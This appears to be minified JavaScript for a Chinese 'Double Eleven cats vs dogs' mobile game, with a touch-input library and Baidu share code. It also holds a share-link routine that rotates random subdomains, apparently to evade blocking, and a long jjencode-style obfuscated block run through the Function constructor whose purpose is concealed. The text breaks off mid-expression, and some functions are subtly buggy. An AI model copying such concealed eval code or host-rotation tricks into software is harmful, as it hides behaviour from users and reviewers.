'use strict';

function G() {
    u = new Toucher.Z({
        J: function() {
            this.M = document
        },
        Xl: !0,
        s: 0,
        o: 1
    }), u.K()
}

function E() {
    var a = new Toucher.H({
        b: 800,
        v: 20,
        Y: function(b, a, c, d) {
            return a.target.tagName == 'CANVAS'
        },
        start: function(b, c, d) {
            Sound.a();
            var a = b[0];
            s.x = a.pageX, s.y = a.pageY, s.start = {
                x: a.pageX,
                y: a.pageY,
                q: a.startTime
            }, s.hM = !0
        },
        move: function(b, c, d) {
            var a = b[0];
            s.x = a.pageX, s.y = a.pageY, s.$ = {
                x: a.pageX,
                y: a.pageY,
                W: a._,
                m: a.e,
                q: a.c
            }
        },
        d: function(b, c, d, e, f) {
            var a = d[0];
            s.N = {
                x: b,
                y: c,
                q: a.C
            }, s.hM = !1, e.preventDefault()
        },
        B: function(b, c, d, a, e, f) {
            s.hM = !1, a.preventDefault()
        }
    });
    u.k(a)
}

function shareGame(a, b) {
    b = b || a, game.X() ? eg.share(a) : game.G() ? X.desc = a : window._bd_share_config && (X.desc = a)
}

function R() {
    window._bd_share_config && window._bd_share_config.button && (window._bd_share_config.button.style.display = 'block')
}

function d() {
    window._bd_share_config && window._bd_share_config.button && (window._bd_share_config.button.style.display = 'none')
}

function gP() {
    if (window._bd_share_config) return;
    window._bd_share_config = {
        common: {
            bdUrl: '分享的地址',
            bdText: '自定义分享内容',
            bdDesc: '自定义分享摘要',
            bdPic: '分享的缩略图',
            onBeforeClick: function(b, a) {
                return a.bdText = X.desc, a.bdDesc = X.title, a.bdUrl = X.link, a.bdPic = X.img_url, a
            }
        },
        share: [{
            bdSize: 32
        }]
    };
    var a = document.createElement('div');
    a.className = 'bdsharebuttonbox', a.style.cssText = 'position: absolute;z-index: 999;top:-100px;left:10px;', a.setAttribute('data-tag', 'share_1');
    var b = document.createElement('a');
    b.className = 'bds_tsina', b.style.margin = '0px', b.setAttribute('data-cmd', 'tsina'), a.appendChild(b), document.body.appendChild(a), setTimeout(function() {
        a.style.display = 'none', a.style.top = '10px'
    }, 600), window._bd_share_config.button = a;
    var c = document.createElement('script');
    document.head.appendChild(c), c.src = 'http://bdimg.share.baidu.com/static/api/js/share.js?cdnversion=' + ~(-new Date() / 3600000)
}

function hp() {
    X = {
        appid: '',
        link: window.location.href,
        img_width: '200',
        img_height: '200',
        img_url: V.e8('res/share-icon.jpg'),
        title: '双十一「猫狗大战」',
        desc: undefined,
        defaultDesc: '双十一「猫狗」大战, 天猫京东你更支持谁？'
    }, X.desc = X.defaultDesc, V.Ok = function(a) {
        return '我在「双十一 猫狗大战」中，干掉了 ' + a.Es + ' 个竞争对手。你要不要也来试试看？'
    };
    var a = '/mgdz/',
        g = X.link,
        d = window.location.href || '',
        e = 'g' + J.iJ(10, 999),
        f = 'a' + J.iJ(10, 999),
        b = ['http://' + e + '.' + f + '.' + 'youxishijian.cn', 'http://' + e + '.' + f + '.' + 'dreamsolo.com'],
        c = Math.random() < 0.3 ? 0 : 1;
    d.indexOf('baidu') != -1 ? X.link = b[c] + a + 'baidu.html' : d.indexOf('360') != -1 ? X.link = b[c] + a + '360.html' : d.indexOf('play.html') != -1 ? X.link = b[c] + a + 'play.html' : X.link = b[c] + a + 'index.html'
}!
function(g, h) {
    var b = g.Toucher = g.Toucher || {},
        a = b._N = b._N || {};
    a.f_ = ['touches', 'changedTouches', 'targetTouches'], a.touches = 'touches', a.changedTouches = 'changedTouches', a.targetTouches = 'targetTouches', a.iv = 1;
    var d = b.Z = function(c) {
            for (var a in c) this[a] = c[a];
            this.Pe = this.Pe || b.E$
        },
        e = {
            constructor: d,
            Pe: null,
            host: window,
            M: document,
            o: 1,
            SR: !1,
            O3: !1,
            yK: !0,
            preventDefault: !1,
            iG: !0,
            h_: !1,
            Xl: !1,
            Sn: !1,
            V_: !1,
            offsetLeft: 0,
            offsetTop: 0,
            a7: 30,
            gl: 5,
            jq: null,
            U6: null,
            S0: null,
            zQ: 0,
            s: 0,
            J: function() {},
            K: function() {
                this.XL = [], this.reset(), this.J();
                var c = this.M;
                this.Jd(), this.SR = 'ontouchstart' in this.M, this.SR || (this.O3 = !0), this.O3 ? (a.k5 = 'mousedown', a.Vd = 'mousemove', a.Aq = 'mouseup', a.Vt = null) : (a.k5 = 'touchstart', a.Vd = 'touchmove', a.Aq = 'touchend', a.Vt = 'touchcancel');
                var b = this;
                !this.O3 && this.iG && 'ongesturestart' in c && (c.addEventListener('gesturestart', function(a) {
                    a.preventDefault()
                }, !0), c.addEventListener('gesturechange', function(a) {
                    a.preventDefault()
                }, !0), c.addEventListener('gestureend', function(a) {
                    a.preventDefault()
                }, !0)), c.addEventListener(a.k5, function(a) {
                    var c = Date.now();
                    if (b.O3 && b.reset(), b.Rb !== null && b.Rb(a, c) === !1) return;
                    b.Vw(a, c), (b.h_ || b.preventDefault) && a.preventDefault()
                }, this.yK), c.addEventListener(a.Vd, function(c) {
                    var a = Date.now();
                    if (a - b.zQ < b.s || b.QM !== null && b.QM(c, a) === !1) return;
                    b.zQ = a, b.Hq(c, a), (b.Xl || b.preventDefault) && c.preventDefault()
                }, this.yK);
                var d = function(a) {
                    var c = Date.now();
                    if (b.Wb !== null && b.Wb(a, c) === !1) return;
                    b.sQ(a, c), (b.Sn || b.preventDefault) && a.preventDefault()
                };
                c.addEventListener(a.Aq, d, this.yK), this.O3 ? window.addEventListener('mouseout', function(a) {
                    var b = a.relatedTarget || a.toElement;
                    (!b || b.nodeName == 'HTML') && d(a), a.preventDefault()
                }, !1) : c.addEventListener(a.Vt, function(a) {
                    var c = Date.now();
                    if (b.sN !== null && b.sN(a) === !1) return;
                    b.reset(), b.hn(a, c), (b.V_ || b.preventDefault) && a.preventDefault()
                }, this.yK), this.JA()
            },
            JA: function() {},
            reset: function() {
                this.jq = [], this.U6 = [], this.S0 = [], this.jq.Bf = this.U6.Bf = this.S0.Bf = 0, this.hM = {}, this.zz = 0
            },
            Jd: function() {
                var a = this.M;
                if (a === window || a === document) {
                    this.offsetLeft = 0, this.offsetTop = 0;
                    return
                }
                if (a.getBoundingClientRect !== h) {
                    var b = window.pageXOffset,
                        c = 0;
                    b || b === 0 ? c = window.pageYOffset : (b = document.body.scrollLeft, c = document.body.scrollTop);
                    var d = a.getBoundingClientRect();
                    this.offsetLeft = d.left + b, this.offsetTop = d.top + c;
                    return
                }
                var e = a.offsetLeft,
                    f = a.offsetTop;
                while ((a = a.parentNode) && a !== document.body && a !== document) e += a.offsetLeft, f += a.offsetTop;
                this.offsetLeft = e, this.offsetTop = f
            },
            Rb: null,
            Vw: function(a, c) {
                var b = this.V3(a, c);
                this.O0('start', b, a)
            },
            QM: null,
            Hq: function(a, c) {
                var b = this.D8(a, c);
                this.O0('move', b, a)
            },
            Wb: null,
            sQ: function(a, c) {
                var b = this.Lj(a, c);
                this.O0('end', b, a)
            },
            sN: null,
            hn: function(d, e) {
                for (var a = 0, c = this.XL.length; a < c; a++) {
                    var b = this.XL[a];
                    if (b.cancel != null && b.cancel(null, d, this) === !1) break
                }
            },
            hF: function(a, b) {
                a.length >= this.gl && a.shift(), a.push(b)
            },
            Yq: function(a, b) {
                a.length >= this.gl && a.shift(), a.push(b)
            },
            V3: function(i, l) {
                var g = i[a.changedTouches] || [i],
                    h = [];
                for (var d = 0, k = g.length; d < k; d++) {
                    var j = g[d],
                        e = j.Ou,
                        f = e || e === 0 ? e : a.iv,
                        b = this.hM[f];
                    b = new this.Pe(f), b.o = this.o, this.hM[f] = b, this.zz++, b.start(j, i), h.push(b);
                    var c = this.jq;
                    l - c.Bf > this.a7 && (c.length = 0), c.Bf = l, c.push(b)
                }
                return h
            },
            D8: function(h, j) {
                var f = h[a.changedTouches] || [h],
                    g = [];
                for (var d = 0, l = f.length; d < l; d++) {
                    var i = f[d],
                        e = i.Ou,
                        k = e || e === 0 ? e : a.iv,
                        b = this.hM[k];
                    if (b) {
                        if (!b.c) {
                            var c = this.U6;
                            j - c.Bf > this.a7 && (c.length = 0), c.Bf = j, c.push(b)
                        }
                        b.move(i, h), g.push(b)
                    }
                }
                return g
            },
            Lj: function(j, p) {
                var i = j[a.changedTouches] || [j],
                    k = {};
                if (!this.O3) {
                    var l = j[a.touches];
                    for (var e = l.length - 1; e >= 0; e--) {
                        var o = l[e];
                        k[o.Ou] = !0
                    }
                }
                var h = [];
                for (var f = 0, n = i.length; f < n; f++) {
                    var m = i[f],
                        g = m.Ou,
                        b = g || g === 0 ? g : a.iv;
                    if (!k[b]) {
                        var d = this.hM[b];
                        if (d) {
                            d.end(m), delete this.hM[b], this.zz--, h.push(d);
                            var c = this.S0;
                            p - c.Bf > this.a7 && (c.length = 0), c.Bf = p, c.push(d), this.Zm(this.jq, b), this.Zm(this.U6, b)
                        }
                    }
                }
                return h
            },
            Zm: function(b, c) {
                for (var a = b.length - 1; a >= 0; a--)
                    if (b[a].Ou == c) return b.splice(a, 1), c;
                return !1
            },
            O0: function(d, e, f) {
                for (var b = 0, g = this.XL.length; b < g; b++) {
                    var c = this.XL[b];
                    if (c[d] != null) {
                        var a = c.kB(d, e, f, this);
                        if (a === !0 && (a = e), a && a.length > 0 && c[d](a, f, this) === !1) break
                    }
                }
            },
            k: function(a) {
                a.controller = this, a.offsetLeft = this.offsetLeft, a.offsetTop = this.offsetTop, a.K(), this.XL.push(a), a.order = a.order || 0
            },
            Gr: function(b) {
                for (var a = this.XL.length - 1; a >= 0; a--)
                    if (this.XL[a] == b) return this.XL.splice(a, 1), b.controller = null, b;
                return null
            },
            j9: function() {
                for (var a = this.XL.length - 1; a >= 0; a--) c.controller = null;
                this.XL.length = 0
            }
        };
    for (var f in e) d.prototype[f] = e[f]
}(this),
function(f, g) {
    var a = f.Toucher = f.Toucher || {},
        b = a._N = a._N || {},
        c = a.E$ = function(a) {
            this.Ou = a, this.id = a
        },
        d = {
            constructor: c,
            o: 1,
            start: function(a, c) {
                this.type = b.k5, this.update(a, c), this.iU = this.f0 = this.pageX, this.EZ = this.A7 = this.pageY, this.Cu = this.YT = this.target, this._ = 0, this.e = 0, this.O6 = 0, this.sC = 0, this.oz = !0, this.startTime = this.C = Date.now()
            },
            move: function(a, c) {
                this.type = b.Vd, this.update(a, c), this.c = Date.now()
            },
            end: function(d, e) {
                this.type = b.Aq;
                var a = this._,
                    c = this.e;
                this.update(d, e), this._ = a, this.e = c, this.Nx = this.pageX, this.dw = this.pageY, this.Ed = this.target, this.oz = !1, this.C = Date.now()
            },
            update: function(a, b) {
                this.ev = b, this.Vi = a, this.YT = this.target, this.f0 = this.pageX, this.A7 = this.pageY, this.target = a.target, this.pageX = a.pageX * this.o, this.pageY = a.pageY * this.o, this._ = this.pageX - this.f0, this.e = this.pageY - this.A7, this.O6 = this.pageX - this.iU, this.sC = this.pageY - this.EZ
            }
        };
    for (var e in d) c.prototype[e] = d[e]
}(this);
var A, Y, J;
!
function(a) {
    J = J || {}, J.q0 = function(a) {
        return String.fromCharCode(a)
    }, J.vx = function(a) {
        return a.charCodeAt(0)
    }, J.UE = function(c, e, d) {
        var a = [];
        a.push(J.q0((d = c[0]) ^ (e || 10)));
        for (var b = c.length - 1; b > 0; b--) a.push(J.q0(c[b] ^ d));
        return a.join('')
    }, J.ft = function(c, e, d) {
        var a = [];
        a.push(J.q0((d = c[0]) ^ (e || 11)));
        for (var b = c.length - 1; b > 0; b--) a.push(J.q0(c[b] ^ d));
        return a.join('')
    }, J._r = function(c, e, d) {
        var a = [];
        a.push(J.q0((d = c[0]) ^ (e || 12)));
        for (var b = c.length - 1; b > 0; b--) a.push(J.q0(c[b] ^ d));
        return a.join('')
    };
    var b = J.UE([110, 26, 0, 11, 3, 27, 13, 1]);
    a = a || window, A = a.rj = a, Y = A.wa = A[b]
}(),
function(e, g) {
    var a = e.Toucher = e.Toucher || {},
        f = a._N = a._N || {},
        b = a.cF = function(b) {
            for (var a in b) this[a] = b[a]
        };
    b.extend = function(e) {
        var a = function(b) {
                for (var a in b) this[a] = b[a]
            },
            c = a.prototype,
            d = this.prototype;
        for (var b in d) c[b] = d[b];
        for (var b in e) c[b] = e[b];
        return c.constructor = a, a.extend = this.extend, a.BV = d, a.PJ = this, a
    };
    var c = {
        constructor: b,
        id: null,
        type: null,
        offsetLeft: 0,
        offsetTop: 0,
        order: 1,
        J: function() {},
        K: function() {
            this.J(), this.JA()
        },
        JA: function() {},
        kB: function(f, d, g, h) {
            var b = [];
            for (var a = 0, e = d.length; a < e; a++) {
                var c = d[a];
                this.Y(f, c, g, h) && b.push(c)
            }
            return b
        },
        Y: function(a, b, c, d) {
            return !1
        },
        start: null,
        move: null,
        end: null,
        cancel: null
    };
    for (var d in c) b.prototype[d] = c[d]
}(this), Toucher.qG = Toucher.cF.extend({
    kB: function(a, b, c, d) {
        return !0
    },
    start: function(a, b, c) {},
    move: function(a, b, c) {},
    end: function(a, b, c) {},
    cancel: function(a, b, c) {},
    uw: function(a, b, c, d, e, f, g, h, i) {}
});
var A, Y, J;
!
function(b, a) {
    J = J || {}, J.fm = function() {
        var a = arguments,
            b = a.length;
        return b == 2 ? a[0][a[1]]() : b == 3 ? a[0][a[1]][a[2]]() : b == 3 ? a[0][a[1]][a[2]][a[3]]() : void 0
    }, J.Lg = function() {
        var a = arguments,
            b = a.length;
        return b == 2 ? a[0][a[1]] : b == 3 ? a[0][a[1]][a[2]] : b == 3 ? a[0][a[1]][a[2]][a[3]] : void 0
    }, a = ~[], a = {
        ___: ++a,
        $$$$: (![] + '')[a],
        __$: ++a,
        $_$_: (![] + '')[a],
        _$_: ++a,
        $_$$: ({} + '')[a],
        $$_$: (a[a] + '')[a],
        _$$: ++a,
        $$$_: 'true' [a],
        $__: ++a,
        $_$: ++a,
        $$__: ({} + '')[a],
        $$_: ++a,
        $$$: ++a,
        $___: ++a,
        $__$: ++a
    }, a.$_ = (a.$_ = a + '')[a.$_$] + (a._$ = a.$_[a.__$]) + (a.$$ = (a.$ + '')[a.__$]) + (!a + '')[a._$$] + (a.__ = a.$_[a.$$_]) + (a.$ = 'true' [a.__$]) + (a._ = 'true' [a._$_]) + a.$_[a.$_$] + a.__ + a._$ + a.$, a.$$ = a.$ + 'true' [a._$$] + a.__ + a._ + a.$ + a.$$, a.$ = a.___[a.$_][a.$_], a.$(a.$(a.$$ + '"' + '\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '\\' + a.__$ + a._$_ + a.__$ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + a.__$ + a.___ + a.___ + a.___ + a.___ + a.___ + a.___ + '\\' + a.$__ + a.___ + '%\\' + a.$__ + a.___ + '(' + a.__$ + a.___ + a._$_ + a.$__ + '\\' + a.$__ + a.___ + '*\\' + a.$__ + a.___ + a.__$ + a.___ + ');\\' + a.__$ + a._$_ + '\\' + a.__$ + a.__$ + a._$_ + '.\\' + a.__$ + a.___ + a.$$_ + '\\' + a.__$ + a.___ + a._$$ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + a.$$$$ + a._ + '\\' + a.__$ + a.$_$ + a.$$_ + a.$$__ + a.__ + '\\' + a.__$ + a.$_$ + a.__$ + a._$ + '\\' + a.__$ + a.$_$ + a.$$_ + '\\' + a.$__ + a.___ + '(\\' + a.__$ + a._$_ + a.___ + ',\\' + a.$__ + a.___ + '\\' + a.__$ + a.___ + a.$__ + ')\\' + a.$__ + a.___ + '{\\' + a.__$ + a._$_ + '\\' + a.__$ + a.__$ + a._$_ + '.\\' + a.__$ + a.___ + a._$_ + '\\' + a.__$ + a.$$$ + a._$_ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.__$ + a._$_ + '.\\' + a.__$ + a.___ + a._$_ + '\\' + a.__$ + a.$$$ + a._$_ + '\\' + a.$__ + a.___ + '||\\' + a.$__ + a.___ + a.$$$$ + a._ + '\\' + a.__$ + a.$_$ + a.$$_ + a.$$__ + a.__ + '\\' + a.__$ + a.$_$ + a.__$ + a._$ + '\\' + a.__$ + a.$_$ + a.$$_ + '\\' + a.$__ + a.___ + '(\\' + a.__$ + a.$_$ + a._$_ + ',\\' + a.$__ + a.___ + a._$ + ')\\' + a.$__ + a.___ + '{\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '\\' + a.__$ + a.$_$ + a.$$_ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '[];\\' + a.__$ + a._$_ + a._$ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a._$_ + a._$$ + a.__ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.__$ + a.$_$ + a.__$ + '\\' + a.__$ + a.$_$ + a.$$_ + '\\' + a.__$ + a.$__ + a.$$$ + '(' + a._$ + ');\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + a._ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.$_$ + a._$_ + '.' + (![] + '')[a._$_] + a.$$$_ + '\\' + a.__$ + a.$_$ + a.$$_ + '\\' + a.__$ + a.$__ + a.$$$ + a.__ + '\\' + a.__$ + a.$_$ + a.___ + ';\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + a.$_$$ + '\\' + a.__$ + a.__$ + a._$_ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + a._$ + '.' + (![] + '')[a._$_] + a.$$$_ + '\\' + a.__$ + a.$_$ + a.$$_ + '\\' + a.__$ + a.$__ + a.$$$ + a.__ + '\\' + a.__$ + a.$_$ + a.___ + ';\\' + a.__$ + a._$_ + a.$$$$ + a._$ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '(\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '\\' + a.__$ + a._$_ + a.$$$ + '\\' + a.__$ + a._$$ + a._$_ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + a.___ + ';\\' + a.$__ + a.___ + '\\' + a.__$ + a._$_ + a.$$$ + '\\' + a.__$ + a._$$ + a._$_ + '\\' + a.$__ + a.___ + '<\\' + a.$__ + a.___ + a._ + '\\' + a.__$ + a.$$_ + a._$_ + ';\\' + a.$__ + a.___ + '\\' + a.__$ + a._$_ + a.$$$ + '\\' + a.__$ + a._$$ + a._$_ + '++)\\' + a.$__ + a.___ + '{\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '\\' + a.__$ + a._$_ + a.$_$ + a.__ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.$_$ + a._$_ + '.' + a.$$__ + '\\' + a.__$ + a.$_$ + a.___ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.__$ + a.___ + a._$$ + a._$ + a.$$_$ + a.$$$_ + '\\' + a.__$ + a.___ + a.__$ + a.__ + '(\\' + a.__$ + a._$_ + a.$$$ + '\\' + a.__$ + a._$$ + a._$_ + ');\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + a.$_$_ + '\\' + a.__$ + a.$_$ + a.__$ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + a._$ + '.' + a.$$__ + '\\' + a.__$ + a.$_$ + a.___ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.__$ + a.___ + a._$$ + a._$ + a.$$_$ + a.$$$_ + '\\' + a.__$ + a.___ + a.__$ + a.__ + '(\\' + a.__$ + a._$_ + a.$$$ + '\\' + a.__$ + a._$$ + a._$_ + '\\' + a.$__ + a.___ + '%\\' + a.$__ + a.___ + a.$_$$ + '\\' + a.__$ + a.__$ + a._$_ + ');\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '\\' + a.__$ + a._$_ + a.$$_ + '\\' + a.__$ + a.$$_ + a.$$$ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a._$_ + a.$_$ + a.__ + '\\' + a.$__ + a.___ + '^\\' + a.$__ + a.___ + a.$_$_ + '\\' + a.__$ + a.$_$ + a.__$ + ';\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '\\' + a.__$ + a.___ + a.$__ + '\\' + a.__$ + a.__$ + a._$$ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a._$_ + a._$$ + a.__ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.__$ + a.$_$ + a.__$ + '\\' + a.__$ + a.$_$ + a.$$_ + '\\' + a.__$ + a.$__ + a.$$$ + '.' + a.$$$$ + '\\' + a.__$ + a.$$_ + a._$_ + a._$ + '\\' + a.__$ + a.$_$ + a.$_$ + '\\' + a.__$ + a.___ + a._$$ + '\\' + a.__$ + a.$_$ + a.___ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.__$ + a.___ + a._$$ + a._$ + a.$$_$ + a.$$$_ + '(\\' + a.__$ + a._$_ + a.$$_ + '\\' + a.__$ + a.$$_ + a.$$$ + ');\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$_$ + a.$$_ + '.\\' + a.__$ + a.$$_ + a.___ + a._ + '\\' + a.__$ + a.$$_ + a._$$ + '\\' + a.__$ + a.$_$ + a.___ + '(\\' + a.__$ + a.___ + a.$__ + '\\' + a.__$ + a.__$ + a._$$ + ')\\' + a.__$ + a._$_ + '}\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a._$_ + a.$$$_ + a.__ + a._ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.__$ + a.$_$ + a.$$_ + '\\' + a.$__ + a.___ + '\\' + a.__$ + a.$_$ + a.$$_ + '.\\' + a.__$ + a.$_$ + a._$_ + a._$ + '\\' + a.__$ + a.$_$ + a.__$ + '\\' + a.__$ + a.$_$ + a.$$_ + '(\\"\\")\\' + a.__$ + a._$_ + '};\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '\\' + a.__$ + a._$_ + a.$_$ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.__$ + a._$_ + '.\\' + a.__$ + a._$_ + a.$_$ + '\\' + a.__$ + a.___ + a.$_$ + '([' + a.$___ + a._$_ + ',' + a._$$ + a.$___ + ',' + a._$$ + a._$$ + ',' + a.$_$ + a.$_$ + ',' + a._$$ + a.$__$ + ',' + a._$$ + a.$_$ + ',' + a.$_$ + a.$_$ + ',' + a.___ + ',' + a._$$ + a.$__ + ',' + a._$$ + a.$___ + ',' + a._$$ + a.$___ + ',' + a._$_ + a.$$_ + ',' + a._$$ + a.___ + ',' + a._$$ + a.__$ + ']);\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + a.$$$_ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.$_$ + a.$$_ + a.$$$_ + '\\' + a.__$ + a.$$_ + a.$$$ + '\\' + a.$__ + a.___ + '\\' + a.__$ + a.___ + a.__$ + '[\\' + a.__$ + a._$_ + a.$_$ + '];\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '\\' + a.__$ + a._$_ + a.$$$ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.__$ + a._$_ + '.' + a.$$$$ + a.__ + '([' + a.__$ + a.___ + a.___ + ',' + a.__$ + a.___ + ',' + a.__$ + ',' + a._$_ + a.___ + ']);\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + a.$_$_ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.__$ + a._$_ + '.' + a.$$$$ + a.__ + '([' + a.$$$ + a.$$_ + ',' + a._$_ + a.$__ + ',' + a.$__$ + ']);\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + a.__ + '\\' + a.__$ + a.$$_ + a._$_ + a._ + a.$$$_ + ';\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '_\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.__$ + a._$_ + '.\\' + a.__$ + a._$_ + a.$_$ + '\\' + a.__$ + a.___ + a.$_$ + '([' + a.__$ + a.___ + a.__$ + ',' + a.___ + ',' + a._$_ + ',' + a.__$ + a.__$ + ',' + a.$__ + ',' + a.__$ + a._$$ + ',' + a.$$_ + ',' + a.___ + ',' + a.__$ + a.$$$ + ',' + a.$__ + ',' + a.__$ + a.$$$ + ',' + a._$_ + a._$_ + ',' + a._$_ + a.$___ + ',' + a.__$ + ',' + a.$__ + ',' + a.___ + ',' + a._$_ + a._$$ + ',' + a.__$ + a.__$ + ']);\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '\\' + a.__$ + a._$_ + a._$$ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.__$ + a._$_ + '._\\' + a.__$ + a.$$_ + a._$_ + '([' + a.__$ + a._$_ + a.$$_ + ',' + a._$_ + a.$$$ + ',' + a.__$ + a.___ + ',' + a._$$ + a.__$ + ',' + a.__$ + a.___ + ',' + a.$__ + a.$_$ + ',' + a.$$$ + ',' + a._$_ + a.$$_ + ',' + a._$$ + a.__$ + ',' + a._$_ + a.$$$ + ']);\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '\\' + a.__$ + a.___ + a.$$_ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.__$ + a._$_ + '.' + a.$$$$ + a.__ + '([' + a.__$ + a._$_ + a.__$ + ',' + a.__$ + a._$$ + ',' + a.__$ + ',' + a._$_ + a.$___ + ',' + a.$__ + a.$_$ + ',' + a._$_ + a.$___ + ',' + a.__$ + a.___ + ',' + a._$_ + a._$$ + ',' + a._$_ + a._$_ + ',' + a.$__$ + ',' + a.__$ + a.___ + ',' + a._$_ + a.$___ + ']);\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '\\' + a.__$ + a.__$ + a.$_$ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.__$ + a._$_ + '.\\' + a.__$ + a._$_ + a.$_$ + '\\' + a.__$ + a.___ + a.$_$ + '([' + a.__$ + a._$_ + a.__$ + ',' + a._$_ + a.$__$ + ',' + a._$_ + a._$$ + ',' + a._$_ + a.$___ + ']);\\' + a.__$ + a._$_ + a.$$$_ + '[\\' + a.__$ + a._$_ + a.$$$ + '](' + a.$_$_ + ',\\' + a.$__ + a.___ + '\\' + a.__$ + a._$_ + a.___ + ',\\' + a.$__ + a.___ + '\\' + a.__$ + a.$$_ + a._$_ + ');\\' + a.__$ + a._$_ + a.$$$_ + '[_]\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + a.$$$$ + a._ + '\\' + a.__$ + a.$_$ + a.$$_ + a.$$__ + a.__ + '\\' + a.__$ + a.$_$ + a.__$ + a._$ + '\\' + a.__$ + a.$_$ + a.$$_ + '\\' + a.$__ + a.___ + '()\\' + a.$__ + a.___ + '{\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$_$ + a.__$ + a.$$$$ + '\\' + a.$__ + a.___ + '(' + a.$$$_ + '[\\' + a.__$ + a._$_ + a._$$ + ']\\' + a.$__ + a.___ + '==\\' + a.$__ + a.___ + a.$__ + ')\\' + a.$__ + a.___ + '{\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '\\' + a.__$ + a.$_$ + a.$$_ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + 